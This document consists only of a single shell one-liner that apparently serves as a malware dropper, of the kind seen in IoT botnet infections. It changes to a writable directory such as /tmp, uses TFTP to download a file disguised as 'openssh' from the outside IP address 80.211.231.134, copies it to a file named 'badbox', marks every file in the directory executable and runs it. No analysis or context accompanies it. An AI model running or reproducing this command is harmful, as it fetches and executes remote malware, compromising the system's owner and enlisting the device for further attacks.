cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 80.211.231.134;cat openssh >badbox;chmod +x *;./badbox
